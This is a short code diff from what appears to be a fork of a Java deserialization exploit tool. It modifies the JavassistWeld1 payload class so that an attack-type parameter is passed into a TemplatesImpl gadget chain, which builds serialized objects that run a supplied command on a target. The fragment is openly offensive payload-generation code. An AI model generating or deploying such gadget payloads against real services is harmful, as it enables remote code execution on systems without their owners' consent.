@@ -31,10 +31,12 @@ import java.util.*;
     "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21" })
 @Authors({ Authors.MATTHIASKAISER })
 public class JavassistWeld1 implements ObjectPayload<Object> {
+	
+	// federicodotta - All supported (TemplateImpl)
 
     public Object getObject(final String command, String attackType) throws Exception {
 
-        final Object gadget = Gadgets.createTemplatesImpl(command);
+        final Object gadget = Gadgets.createTemplatesImpl(command, attackType);
 
         InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
         ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
